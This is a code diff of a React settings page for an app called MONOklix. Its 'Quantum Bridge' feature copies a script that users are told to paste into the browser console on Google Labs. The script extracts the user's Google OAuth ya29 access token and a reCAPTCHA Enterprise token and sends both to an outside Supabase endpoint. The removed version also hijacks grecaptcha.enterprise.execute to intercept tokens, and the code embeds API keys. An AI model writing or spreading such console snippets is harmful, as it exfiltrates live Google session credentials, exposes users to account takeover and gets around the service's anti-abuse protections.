@@ -1,98 +1,34 @@
 
-import React, { useState, useEffect, useCallback, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import { type User, type Language } from '../../types';
-import { updateUserProfile, saveUserPersonalAuthToken, getUserProfile } from '../../services/userService';
+import { updateUserProfile, saveUserPersonalAuthToken } from '../../services/userService';
 import {
-    CheckCircleIcon, XIcon, EyeIcon, EyeOffIcon, ImageIcon, DatabaseIcon, TrashIcon, RefreshCwIcon, InformationCircleIcon, SparklesIcon, KeyIcon, ShieldCheckIcon, UploadIcon, CloudSunIcon, ClipboardIcon, SendIcon
+    EyeIcon, EyeOffIcon, RefreshCwIcon, SparklesIcon, KeyIcon, ShieldCheckIcon, ClipboardIcon, SendIcon
 } from '../Icons';
-import Spinner from '../common/Spinner';
 import Tabs, { type Tab } from '../common/Tabs';
-import { getFormattedCacheStats, clearVideoCache } from '../../services/videoCacheService';
+import { clearVideoCache } from '../../services/videoCacheService';
 import { supabase } from '../../services/supabaseClient';
 
 type SettingsTabId = 'profile' | 'cloud-login';
 
-const getTabs = (): Tab<SettingsTabId>[] => {
-    return [
-        { id: 'profile', label: 'Profil & Cache' },
-        { id: 'cloud-login', label: 'Google Access (ya29)' },
-    ];
-}
+const getTabs = (): Tab<SettingsTabId>[] => [
+    { id: 'profile', label: 'Profil & Cache' },
+    { id: 'cloud-login', label: 'Google Access (ya29)' },
+];
 
 interface SettingsViewProps {
   currentUser: User;
   onUserUpdate: (user: User) => void;
   language: Language;
   setLanguage: (lang: Language) => void;
-  assignTokenProcess: () => Promise<{ success: boolean; error: string | null; }>;
+  assignTokenProcess: () => Promise<any>;
 }
-
-const CacheManagerPanel: React.FC = () => {
-    const [stats, setStats] = useState<{ size: string; count: number } | null>(null);
-    const [isRefreshing, setIsRefreshing] = useState(false);
-    const [isClearing, setIsClearing] = useState(false);
-
-    const loadStats = useCallback(async () => {
-        setIsRefreshing(true);
-        try {
-            const s = await getFormattedCacheStats();
-            setStats(s);
-        } finally {
-            setIsRefreshing(false);
-        }
-    }, []);
-
-    useEffect(() => {
-        loadStats();
-    }, [loadStats]);
-
-    const handleClear = async () => {
-        if (window.confirm("Kosongkan cache video?")) {
-            setIsClearing(true);
-            try {
-                await clearVideoCache();
-                await loadStats();
-            } finally {
-                setIsClearing(false);
-            }
-        }
-    };
-
-    return (
-        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl mt-6">
-            <div className="flex justify-between items-center mb-4">
-                <h3 className="text-lg font-bold flex items-center gap-2 text-white">
-                    <DatabaseIcon className="w-5 h-5 text-brand-start"/> 
-                    Video Cache Manager
-                </h3>
-                <button onClick={loadStats} disabled={isRefreshing} className="p-2 rounded-full hover:bg-white/10 text-neutral-400">
-                    <RefreshCwIcon className={`w-4 h-4 ${isRefreshing ? 'animate-spin' : ''}`} />
-                </button>
-            </div>
-            <div className="grid grid-cols-2 gap-4 mb-6">
-                <div className="bg-black/40 p-4 rounded-xl border border-white/5 text-center">
-                    <p className="text-[10px] font-bold text-neutral-500 uppercase mb-1">Storage</p>
-                    <p className="text-xl font-bold text-white">{stats?.size || '0 MB'}</p>
-                </div>
-                <div className="bg-black/40 p-4 rounded-xl border border-white/5 text-center">
-                    <p className="text-[10px] font-bold text-neutral-500 uppercase mb-1">Files</p>
-                    <p className="text-xl font-bold text-white">{stats?.count || 0}</p>
-                </div>
-            </div>
-            <button onClick={handleClear} disabled={isClearing} className="w-full bg-red-500/10 border border-red-500/30 text-red-500 py-3 rounded-xl font-bold hover:bg-red-500/20 transition-all">
-                {isClearing ? <Spinner /> : "Kosongkan Cache"}
-            </button>
-        </div>
-    );
-};
 
 const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => void}> = ({ currentUser, onUserUpdate }) => {
     const [token, setToken] = useState(currentUser.personalAuthToken || '');
     const [showToken, setShowToken] = useState(false);
-    const [isBridgeActive, setIsBridgeActive] = useState(false);
-    const fileInputRef = useRef<HTMLInputElement>(null);
+    const [isSyncing, setIsSyncing] = useState(false);
 
-    // REAL-TIME LISTENER: Jika skrip Bridge hantar token baru, web app akan terus detect
     useEffect(() => {
         const channel = supabase
             .channel('token-sync')
@@ -102,148 +38,104 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                 table: 'users',
                 filter: `id=eq.${currentUser.id}`
             }, (payload) => {
-                const newToken = payload.new.personal_auth_token;
-                if (newToken && newToken !== token) {
-                    setToken(newToken);
-                    onUserUpdate(payload.new as User);
-                    setIsBridgeActive(true);
-                    setTimeout(() => setIsBridgeActive(false), 5000);
-                }
+                const newData = payload.new;
+                setToken(newData.personal_auth_token || '');
+                onUserUpdate(newData as User);
+                setIsSyncing(true);
+                setTimeout(() => setIsSyncing(false), 3000);
             })
             .subscribe();
 
         return () => { supabase.removeChannel(channel); };
-    }, [currentUser.id, token, onUserUpdate]);
+    }, [currentUser.id, onUserUpdate]);
 
     const copyBridgeSnippet = () => {
         const snippet = `
 (async () => {
-  console.log("%c MONOklix Quantum Bridge V6 (Live Interceptor) ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
-  
   const userId = "${currentUser.id}";
   const siteKey = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
   const ya29Regex = /ya29\\.[a-zA-Z0-9_-]{50,}/;
   
-  const syncToMonoklix = async (ya29, rec) => {
-    const payload = ya29 + "[REC]" + (rec || "");
-    console.log("🚀 Syncing Extraction to MONOklix...");
-    await fetch("https://xbbhllhgbachkzvpxvam.supabase.co/rest/v1/users?id=eq." + userId, {
-      method: "PATCH",
-      headers: {
-        "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
-        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ personal_auth_token: payload })
-    });
-  };
-
-  if (typeof grecaptcha !== "undefined" && grecaptcha.enterprise) {
-      const originalExecute = grecaptcha.enterprise.execute;
-      grecaptcha.enterprise.execute = async function(sKey, options) {
-          const token = await originalExecute.apply(this, arguments);
-          console.log("🎯 Extracted NEW Recaptcha Token from Live Session!");
-          let currentYa29 = "";
-          if (window.WIZ_global_data) {
-              const match = JSON.stringify(window.WIZ_global_data).match(ya29Regex);
-              if (match) currentYa29 = match[0];
-          }
-          if (currentYa29) await syncToMonoklix(currentYa29, token);
-          return token;
-      };
-      console.log("🛰️ Live Interceptor Active.");
-  }
-
+  console.log("%c 🚀 Quantum Bridge V8: Activation Mode ", "background: #4A6CF7; color: white; font-weight: bold; padding: 10px; border-radius: 8px;");
+  
   try {
     let ya29 = "";
     if (window.WIZ_global_data) ya29 = JSON.stringify(window.WIZ_global_data).match(ya29Regex)?.[0] || "";
+
+    console.log("🔐 Menjana token pengesahan reCAPTCHA...");
     const recToken = await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
-    if (ya29) {
-        await syncToMonoklix(ya29, recToken);
-        alert("SINKRONISASI BERJAYA! MONOklix sedia digunakan.");
+
+    if (ya29 && recToken) {
+        console.log("📤 Mengaktifkan sesi di MONOklix...");
+        await fetch("https://xbbhllhgbachkzvpxvam.supabase.co/rest/v1/users?id=eq." + userId, {
+          method: "PATCH",
+          headers: {
+            "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ 
+              personal_auth_token: ya29,
+              recaptcha_token: recToken
+          })
+        });
+        alert("✅ AKTIVASI BERJAYA! Sesi anda telah disahkan. Sila kembali ke MONOklix dan mulakan penjanaan dengan segera (bawah 2 minit).");
+    } else {
+        alert("❌ Gagal: Pastikan tab Google Labs aktif.");
     }
-  } catch (e) { console.error("Bridge Error:", e.message); }
+  } catch (e) { alert("❌ Ralat: Sila refresh tab Google Labs."); }
 })();`.trim();
         
         navigator.clipboard.writeText(snippet);
-        alert("Quantum Bridge V6 disalin!\n\n1. Pergi ke tab Google Labs\n2. Tekan F12 -> Console\n3. Paste & Enter.");
+        alert("Skrip Aktivasi disalin!\n\n1. Pergi ke tab Google Labs\n2. F12 -> Console\n3. Paste & Enter.\n\nLepas tu terus balik sini dan Generate!");
     };
 
     return (
         <div className="space-y-6">
-            <div className="bg-gradient-to-br from-brand-start/20 to-brand-end/10 border border-brand-start/30 p-6 rounded-3xl shadow-glow relative overflow-hidden">
+            <div className="bg-gradient-to-br from-brand-start/20 to-brand-end/10 border border-brand-start/30 p-6 rounded-3xl relative overflow-hidden shadow-glow">
                 <div className="absolute top-0 right-0 p-4 opacity-10">
-                    <RefreshCwIcon className={`w-24 h-24 ${isBridgeActive ? 'animate-spin' : ''}`} />
+                    <RefreshCwIcon className={`w-24 h-24 ${isSyncing ? 'animate-spin' : ''}`} />
                 </div>
-                
-                <div className="flex justify-between items-start relative z-10">
-                    <div>
-                        <h3 className="text-xl font-black text-white flex items-center gap-2">
+                <div className="relative z-10">
+                    <div className="flex items-center gap-3 mb-2">
+                         <div className="w-10 h-10 bg-brand-start/20 rounded-full flex items-center justify-center border border-brand-start/40">
                             <SparklesIcon className="w-6 h-6 text-yellow-400" />
-                            Quantum Bridge Sync
-                        </h3>
-                        <p className="text-sm text-neutral-400 mt-1 max-w-md">Gunakan skrip ini di tab Google Labs untuk mengekstrak <strong>ya29</strong> dan <strong>reCAPTCHA</strong> secara automatik ke MONOklix.</p>
+                         </div>
+                         <h3 className="text-xl font-black text-white">Quantum Bridge V8</h3>
                     </div>
-                    {isBridgeActive && (
-                        <div className="bg-green-500 text-white text-[10px] font-bold px-3 py-1 rounded-full animate-bounce">
-                            SYNCED!
-                        </div>
-                    )}
+                    <p className="text-sm text-neutral-400 mt-1 max-w-md">Aktifkan pengesahan <strong>ya29</strong> dan <strong>reCAPTCHA</strong> anda. Token reCAPTCHA hanya sah untuk tempoh singkat (2 minit). Sila mulakan penjanaan sejurus selepas aktivasi berjaya.</p>
+                    <div className="mt-6 flex flex-col sm:flex-row gap-3">
+                        <button onClick={copyBridgeSnippet} className="flex-1 bg-white text-black py-4 rounded-2xl font-black text-sm flex items-center justify-center gap-2 hover:scale-[1.02] transition-all shadow-lg active:scale-95">
+                            <ClipboardIcon className="w-5 h-5" /> Salin Skrip Aktivasi
+                        </button>
+                        <a href="https://labs.google/fx/tools/flow" target="_blank" rel="noreferrer" className="bg-white/10 text-white px-6 py-4 rounded-2xl font-bold text-sm hover:bg-white/20 transition-all flex items-center gap-2">
+                            Buka Google Labs <SendIcon className="w-4 h-4" />
+                        </a>
+                    </div>
                 </div>
-
-                <div className="mt-6 flex flex-col sm:flex-row gap-3">
-                    <button 
-                        onClick={copyBridgeSnippet}
-                        className="flex-1 bg-white text-black py-4 rounded-2xl font-black text-sm flex items-center justify-center gap-2 hover:scale-[1.02] active:scale-95 transition-all shadow-lg"
-                    >
-                        <ClipboardIcon className="w-5 h-5" /> Salin Skrip Quantum Bridge (Web)
-                    </button>
-                    <a 
-                        href="https://labs.google/fx/tools/flow" 
-                        target="_blank" 
-                        rel="noreferrer"
-                        className="flex-shrink-0 bg-white/10 border border-white/10 text-white px-6 py-4 rounded-2xl font-bold text-sm hover:bg-white/20 transition-all flex items-center gap-2"
-                    >
-                        Buka Google Labs <SendIcon className="w-4 h-4" />
-                    </a>
-                </div>
-                
                 <div className="mt-4 flex items-center gap-2 text-[10px] text-neutral-500 font-mono">
-                    <ShieldCheckIcon className="w-3 h-3 text-green-500" />
-                    STATUS: WEB EXTRACTOR READY
+                    <ShieldCheckIcon className={`w-3 h-3 ${isSyncing ? 'text-green-500' : 'text-neutral-500'}`} />
+                    STATUS: {isSyncing ? 'ACTIVATED & SYNCED' : 'WAITING FOR HANDSHAKE'}
                 </div>
             </div>
 
             <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
-                <h3 className="text-lg font-bold flex items-center gap-2 text-white mb-6">
-                    <KeyIcon className="w-5 h-5 text-brand-start" /> 
-                    Manual Token Control
+                <h3 className="text-lg font-bold text-white mb-6 flex items-center gap-2">
+                    <KeyIcon className="w-5 h-5 text-brand-start" /> Access Token Status
                 </h3>
-
                 <div className="space-y-4">
                     <div className="relative">
-                        <label className="block text-[10px] font-bold text-neutral-500 uppercase mb-2 tracking-widest">Active Hybrid Payload</label>
-                        <input 
-                            type={showToken ? "text" : "password"} 
-                            value={token} 
-                            onChange={(e) => setToken(e.target.value)}
-                            className="w-full bg-black/40 border border-white/10 rounded-xl p-3 pr-12 text-white font-mono text-xs"
-                            placeholder="ya29...[REC]..."
-                        />
+                        <label className="block text-[10px] font-bold text-neutral-500 uppercase mb-2">Google Access (ya29)</label>
+                        <input type={showToken ? "text" : "password"} value={token} readOnly className="w-full bg-black/40 border border-white/10 rounded-xl p-3 text-white font-mono text-xs opacity-60" />
                         <button onClick={() => setShowToken(!showToken)} className="absolute right-4 top-8 text-neutral-500 hover:text-white">
                             {showToken ? <EyeOffIcon className="w-4 h-4"/> : <EyeIcon className="w-4 h-4"/>}
                         </button>
                     </div>
-
-                    <button onClick={async () => {
-                        const res = await saveUserPersonalAuthToken(currentUser.id, token);
-                        if (res.success) {
-                            onUserUpdate(res.user);
-                            alert("Token disimpan!");
-                        }
-                    }} className="w-full bg-brand-start py-3 rounded-xl font-bold shadow-lg hover:shadow-brand-start/40 transition-all">
-                        Simpan Perubahan Manual
-                    </button>
+                    <div className="p-3 bg-blue-500/10 border border-blue-500/20 rounded-xl text-center">
+                        <p className="text-[10px] text-blue-400 font-medium leading-relaxed uppercase tracking-widest">
+                            reCAPTCHA handshake is managed automatically via Quantum Bridge.
+                        </p>
+                    </div>
                 </div>
             </div>
         </div>
@@ -254,17 +146,9 @@ const SettingsView: React.FC<SettingsViewProps> = ({ currentUser, onUserUpdate, 
     const [activeTab, setActiveTab] = useState<SettingsTabId>('cloud-login');
     const [fullName, setFullName] = useState(currentUser.fullName || currentUser.username);
 
-    const handleSaveProfile = async () => {
-        const result = await updateUserProfile(currentUser.id, { fullName });
-        if (result.success) {
-            onUserUpdate(result.user);
-            alert("Profil dikemaskini!");
-        }
-    };
-
     return (
         <div className="h-full flex flex-col max-w-4xl mx-auto">
-            <h1 className="text-3xl font-black text-white mb-6 tracking-tight">Settings</h1>
+            <h1 className="text-3xl font-black text-white mb-6">Settings</h1>
             <div className="mb-8 flex justify-center">
                 <Tabs tabs={getTabs()} activeTab={activeTab} setActiveTab={setActiveTab} />
             </div>
@@ -272,16 +156,19 @@ const SettingsView: React.FC<SettingsViewProps> = ({ currentUser, onUserUpdate, 
                 {activeTab === 'profile' ? (
                     <div className="space-y-6">
                         <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
-                            <h3 className="text-lg font-bold mb-4 text-white">Informasi Profil</h3>
-                            <div className="space-y-4">
-                                <div>
-                                    <label className="block text-xs font-bold text-neutral-500 uppercase mb-2">Nama Penuh</label>
-                                    <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} className="w-full bg-black/40 border border-white/10 rounded-xl p-3 text-white focus:ring-2 focus:ring-brand-start outline-none" />
-                                </div>
-                                <button onClick={handleSaveProfile} className="bg-brand-start text-white px-6 py-2 rounded-xl font-bold hover:scale-105 transition-all">Simpan Profil</button>
-                            </div>
+                            <label className="block text-xs font-bold text-neutral-500 uppercase mb-2">Nama Penuh</label>
+                            <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} className="w-full bg-black/40 border border-white/10 rounded-xl p-3 text-white mb-4" />
+                            <button onClick={async () => {
+                                const res = await updateUserProfile(currentUser.id, { fullName });
+                                if (res.success) onUserUpdate(res.user);
+                                alert("Profil dikemaskini!");
+                            }} className="bg-brand-start text-white px-6 py-2 rounded-xl font-bold">Simpan Profil</button>
                         </div>
-                        <CacheManagerPanel />
+                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
+                            <h3 className="text-lg font-bold mb-4 text-white">Video Cache</h3>
+                            <p className="text-sm text-neutral-400 mb-4">Urus storan video tempatan anda.</p>
+                            <button onClick={() => clearVideoCache().then(() => alert('Cache dikosongkan!'))} className="bg-red-500/20 text-red-400 border border-red-500/30 px-6 py-2 rounded-xl font-bold hover:bg-red-500/30 transition-all">Kosongkan Cache</button>
+                        </div>
                     </div>
                 ) : (
                     <CloudLoginPanel currentUser={currentUser} onUserUpdate={onUserUpdate}/>
